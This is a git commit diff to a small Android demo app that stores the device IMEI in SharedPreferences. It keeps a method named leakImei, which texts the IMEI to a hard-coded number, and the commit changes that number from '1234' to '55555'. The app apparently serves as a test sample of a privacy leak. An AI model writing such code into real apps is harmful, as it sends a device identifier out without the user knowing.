0b526563dddc9b891964d13a7fec44619dd9cdd8
shivapbhusal <civabhusal@gmail.com>
2018-02-11 18:02:27 -0500

    refactor, finalize sharedPreferences

--- SharedPreference/app/src/main/java/com/example/shiva/sharedpreference/MainActivity.java
+++ SharedPreference/app/src/main/java/com/example/shiva/sharedpreference/MainActivity.java
@@ -1,18 +1,15 @@
 package com.example.shiva.sharedpreference;
 
-import android.app.Activity;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.widget.Toast;
 
-import static android.app.PendingIntent.getActivity;
 
 public class MainActivity extends AppCompatActivity {
-    public static final String PREFS_NAME="MyPrefsFile";
+    public static final String PREF="myPrefFile";
     public static final String IMEI="imei";
     SharedPreferences sharedPref;
 
@@ -33,7 +30,7 @@ public class MainActivity extends AppCompatActivity {
 
     public void storeImei(String imei)
     {
-        sharedPref=getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        sharedPref=getSharedPreferences(PREF, Context.MODE_PRIVATE);
         SharedPreferences.Editor editor=sharedPref.edit();
         editor.putString(IMEI,imei);
         editor.commit();
@@ -41,7 +38,7 @@ public class MainActivity extends AppCompatActivity {
 
     public String retriveImei() // Retrive from shared Preference
     {
-        SharedPreferences settings=getSharedPreferences(PREFS_NAME,Context.MODE_PRIVATE);
+        SharedPreferences settings=getSharedPreferences(PREF,Context.MODE_PRIVATE);
         String imei=settings.getString(IMEI,null);
         return imei;
     }
@@ -49,7 +46,7 @@ public class MainActivity extends AppCompatActivity {
     public void leakImei(String imei)
     {
         SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("1234", null, imei, null, null);
+        sms.sendTextMessage("55555", null, imei, null, null);
 
     }
 
